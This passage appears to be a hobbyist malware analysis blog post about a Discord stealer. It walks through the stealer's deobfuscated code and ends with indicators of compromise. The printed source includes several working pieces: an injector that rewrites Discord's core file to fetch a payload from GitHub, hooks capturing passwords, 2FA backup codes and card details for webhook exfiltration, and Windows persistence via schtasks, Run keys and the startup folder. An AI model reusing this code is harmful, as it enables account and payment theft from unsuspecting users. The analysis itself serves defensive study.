    const _0x218563 = {
      'content': '**' + _0x5c18a7.username + "** Just Got Injected!",
      'embeds': [{
        'fields': [{
          'name': 'Email',
          'value': '`' + _0x5c18a7.email + '`',
          'inline': true
        }, {
          'name': 'Phone',
          'value': '`' + (_0x5c18a7.phone || "None") + '`',
          'inline': true
        }]
      }]
    };
    await hooker(_0x218563, _0x49270d, _0x5c18a7);
    clearAllUserData();
  }
  const {
    resourcePath: _0x31abdd,
    app: _0x4d42a0
  } = discordPath;
  if (_0x31abdd === undefined || _0x4d42a0 === undefined) {
    return;
  }
  const _0x407011 = path.join(_0x31abdd, "app");
  const _0xc5d291 = path.join(_0x407011, 'package.json');
  const _0x50cd34 = path.join(_0x407011, "index.js");
  const _0x4cb22f = fs.readdirSync(_0x4d42a0 + "\\modules\\").filter(_0x9e255b => /discord_desktop_core-+?/.test(_0x9e255b))[0x0];
  const _0x22c6d9 = _0x4d42a0 + "\\modules\\" + _0x4cb22f + "\\discord_desktop_core\\index.js";
  const _0x2493ff = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x407011)) {
    fs.mkdirSync(_0x407011);
  }
  if (fs.existsSync(_0xc5d291)) {
    fs.unlinkSync(_0xc5d291);
  }
  if (fs.existsSync(_0x50cd34)) {
    fs.unlinkSync(_0x50cd34);
  }
  if (process.platform === 'win32' || process.platform === "darwin") {
    fs.writeFileSync(_0xc5d291, JSON.stringify({
      'name': "discord",
      'main': 'index.js'
    }, null, 0x4));
    const _0x37ddfc = "const fs = require('fs'), https = require('https');\n  const indexJs = '" + _0x22c6d9 + "';\n  const bdPath = '" + _0x2493ff + "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" + 'https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js' + "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" + path.join(_0x31abdd, "app.asar") + "')\n  if (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x50cd34, _0x37ddfc.replace(/\\/g, "\\\\"));
  }
}
let email = '';
let password = '';
let initiationCalled = false;
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0x0];
  if (!mainWindow) {
    return;
  }
  mainWindow.webContents["debugger"].attach("1.3");
  mainWindow.webContents['debugger'].on("message", async (_0xdd9243, _0x114ee8, _0x204af6) => {
    if (!initiationCalled) {
      await initiation();
      initiationCalled = true;
    }
    if (_0x114ee8 !== "Network.responseReceived") {
      return;
    }
    if (!CONFIG.filters.urls.some(_0x298458 => _0x204af6.response.url.endsWith(_0x298458))) {
      return;
    }
    if (![0xc8, 0xca].includes(_0x204af6.response.status)) {
      return;
    }
    const _0x249d05 = await mainWindow.webContents["debugger"].sendCommand('Network.getResponseBody', {
      'requestId': _0x204af6.requestId
    });
    const _0x409dc0 = JSON.parse(_0x249d05.body);
    const _0x1006ab = await mainWindow.webContents["debugger"].sendCommand("Network.getRequestPostData", {
      'requestId': _0x204af6.requestId
    });
    const _0x51769f = JSON.parse(_0x1006ab.postData);
    switch (true) {
      case _0x204af6.response.url.endsWith("/login"):
        if (!_0x409dc0.token) {
          email = _0x51769f.login;
          password = _0x51769f.password;
          return;
        }
        EmailPassToken(_0x51769f.login, _0x51769f.password, _0x409dc0.token, "logged in");
        break;
      case _0x204af6.response.url.endsWith("/register"):
        EmailPassToken(_0x51769f.email, _0x51769f.password, _0x409dc0.token, "signed up");
        break;
      case _0x204af6.response.url.endsWith("/totp"):
        EmailPassToken(email, password, _0x409dc0.token, "logged in with 2FA");
        break;
      case _0x204af6.response.url.endsWith("/codes-verification"):
        BackupCodesViewed(_0x409dc0.backup_codes, await getToken());
        break;
      case _0x204af6.response.url.endsWith("/@me"):
        if (!_0x51769f.password) {
          return;
        }
        if (_0x51769f.email) {
          EmailPassToken(_0x51769f.email, _0x51769f.password, _0x409dc0.token, "changed his email to **" + _0x51769f.email + '**');
        }
        if (_0x51769f.new_password) {
          PasswordChanged(_0x51769f.new_password, _0x51769f.password, _0x409dc0.token);
        }
        break;
    }
  });
  mainWindow.webContents["debugger"].sendCommand("Network.enable");
  mainWindow.on("closed", () => {
    createWindow();
  });
};
createWindow();
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (_0x3552da, _0x4a01de) => {
  if (![0xc8, 0xca].includes(_0x3552da.statusCode)) {
    return;
  }
  if (_0x3552da.method != "POST") {
    return;
  }
  switch (true) {
    case _0x3552da.url.endsWith('tokens'):
      const _0x25f242 = querystring.parse(Buffer.from(_0x3552da.uploadData[0x0].bytes).toString());
      CreditCardAdded(_0x25f242['card[number]'], _0x25f242["card[cvc]"], _0x25f242['card[exp_month]'], _0x25f242['card[exp_year]'], await getToken());
      break;
    case _0x3552da.url.endsWith('paypal_accounts'):
      PaypalAdded(await getToken());
      break;
  }
});
session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (_0x134ee1, _0x5bba4b) => {
  if (_0x134ee1.url.startsWith("wss://remote-auth-gateway") || _0x134ee1.url.endsWith("auth/sessions")) {
    return _0x5bba4b({
      'cancel': true
    });
  }
});
module.exports = require("./core.asar");
```
it forced the discord to update after injected this malicious code into the programfile 

```py!
command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
await result.communicate()
```
Basiclly what is did was:

-It used executeJavaScript to extract the Discord token from the Electron-based Discord client then hooks into Discord's WebSocket authentication system to capture session tokens.

```js!
switch (true) {
      case _0x204af6.response.url.endsWith("/login"):
        if (!_0x409dc0.token) {
          email = _0x51769f.login;
          password = _0x51769f.password;
          return;
        }
        EmailPassToken(_0x51769f.login, _0x51769f.password, _0x409dc0.token, "logged in");
        break;
      case _0x204af6.response.url.endsWith("/register"):
        EmailPassToken(_0x51769f.email, _0x51769f.password, _0x409dc0.token, "signed up");
        break;
      case _0x204af6.response.url.endsWith("/totp"):
        EmailPassToken(email, password, _0x409dc0.token, "logged in with 2FA");
        break;
      case _0x204af6.response.url.endsWith("/codes-verification"):
        BackupCodesViewed(_0x409dc0.backup_codes, await getToken());
        break;
      case _0x204af6.response.url.endsWith("/@me"):
        if (!_0x51769f.password) {
          return;
        }
        if (_0x51769f.email) {
          EmailPassToken(_0x51769f.email, _0x51769f.password, _0x409dc0.token, "changed his email to **" + _0x51769f.email + '**');
        }
        if (_0x51769f.new_password) {
          PasswordChanged(_0x51769f.new_password, _0x51769f.password, _0x409dc0.token);
        }
        break;
    }

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (_0x134ee1, _0x5bba4b) => {
  if (_0x134ee1.url.startsWith("wss://remote-auth-gateway") || _0x134ee1.url.endsWith("auth/sessions")) {
    return _0x5bba4b({
      'cancel': true
    });
  }
});
```

-After that it start capturing email, passwords, and 2FA backup codes, logs newly added credit card details (number, CVC, expiration) finally hooks into PayPal and Stripe API calls to steal payment details.

```js!
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (_0x3552da, _0x4a01de) => {
  if (![0xc8, 0xca].includes(_0x3552da.statusCode)) {
    return;
  }
  if (_0x3552da.method != "POST") {
    return;
  }
  switch (true) {
    case _0x3552da.url.endsWith('tokens'):
      const _0x25f242 = querystring.parse(Buffer.from(_0x3552da.uploadData[0x0].bytes).toString());
      CreditCardAdded(_0x25f242['card[number]'], _0x25f242["card[cvc]"], _0x25f242['card[exp_month]'], _0x25f242['card[exp_year]'], await getToken());
      break;
    case _0x3552da.url.endsWith('paypal_accounts'):
      PaypalAdded(await getToken());
      break;
  }
});
```

-It will also try to send stolen data to a configured Discord webhook by using the hooker function to format and send stolen account details.

-Finally it will Attempt to clear stored session data and restart Discord to re-inject itself again by re-downloading the malicious JavaScript (which was this same script) from github.

```js!
 if (process.platform === 'win32' || process.platform === "darwin") {
    fs.writeFileSync(_0xc5d291, JSON.stringify({
      'name': "discord",
      'main': 'index.js'
    }, null, 0x4));
    const _0x37ddfc = "const fs = require('fs'), https = require('https');\n  const indexJs = '" + _0x22c6d9 + "';\n  const bdPath = '" + _0x2493ff + "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" + 'https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js' + "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" + path.join(_0x31abdd, "app.asar") + "')\n  if (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x50cd34, _0x37ddfc.replace(/\\/g, "\\\\"));
  }
```
![image](https://hackmd.io/_uploads/rJNuiCrnyg.png)

It will also modify your registry to setup a schedule, logon task

```py!
class Startup:
    def __init__(self) -> None:
        self.LocalAppData = os.getenv("LOCALAPPDATA")
        self.RoamingAppData = os.getenv("APPDATA")
        self.CurrentFile = os.path.abspath(sys.argv[0])
        self.Privalage:bool = SubModules.IsAdmin()
        self.ToPath:str = os.path.join(self.LocalAppData, "DfwxUpdateService", "dfwx.exe")
    async def main(self) -> None:
        await self.CreatePathAndMelt()
        print("[+] Started startup injection.")
        if startup_method == "schtasks":
            await self.SchtaskStartup()
        elif startup_method == "regedit":
            await self.RegeditStartup()
        elif startup_method == "folder":
            await self.FolderStartup()
        else:print("[-] unsupported or unkown startup method!")
        print(f"[+] Succesfully executed startup injection.")
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                return
            else:
                os.mkdir(self.ToPath.replace("dfwx.exe", "")) # Create Directory
                shutil.copyfile(self.CurrentFile, self.ToPath) # copy to current file to local appdata directory
                process = await asyncio.create_subprocess_shell(
                f'attrib +h +s "{self.ToPath}"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate() # Melting file and give to system file privilages
        except Exception as e:
            print(str(e)) # print error if has error
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "DfwxUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await command.communicate() # checking if the file on schtask or not
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "DfwxUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "DfwxUpdateService2" /tr "{self.ToPath}"'
                        process = await asyncio.create_subprocess_shell(onLogonCommand, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                        await process.communicate()
                        process2 = await asyncio.create_subprocess_shell(everyOneHour, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                        await process2.communicate()
                    except: # if the moduel cant load try to run the command
                        pass
                else: # if code not running on admin privilage, first get admin priv and then execute
                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        os._exit(0)
                    else: # if the user not give the admin req
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "DfwxUpdateService" /tr "{self.ToPath}"'
                            process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                            await process.communicate()
                        except:
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "DfwxUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
        except Exception as e:
            print(str(e)) # print error if has error
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Dfwx Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
            else: # if the code running admin privilage, copy to HKLM
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Dfwx Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
        except Exception as e:
            print(str(e))
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\dfwx.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\dfwx.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "dfwx.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "dfwx.exe"))
        except Exception as e:
            print(str(e))
```

```
IoCs:

https[:]//discordapp[.]com/api/webhooks/1349001056893538305/GHd5AURS7mt2MaQ6LvGL_v5kLBD_dkUzYI4x4sMXSRtfE9s1w76KjagYKTXWLEbKJCcj

https[:]//raw[.]githubusercontent[.]com/patrickzxxxxq/injection/main/etitz[.]js

https[:]//github[.]com/patrickzxxxxq

dfwx.exe: fcef0944b1f15860e8c7c5c21725272d50a51a2ba9e9e634a4fb900b27004743 (SHA256)

payload.exe: 41245f09293fcc0cb97bb36e4a9d79b3b2c50d6d9f1e21ea3bd66b44d9629afe (SHA256)
```

---

Note: Thank you so much for reading till this point, this was a quick analyze of mine, since I just started reversing this in the morning and I have finished written this blog at around 1AM the next day <3

Contact me via Discord:

![image](https://hackmd.io/_uploads/Bkj9wJLnyx.png)
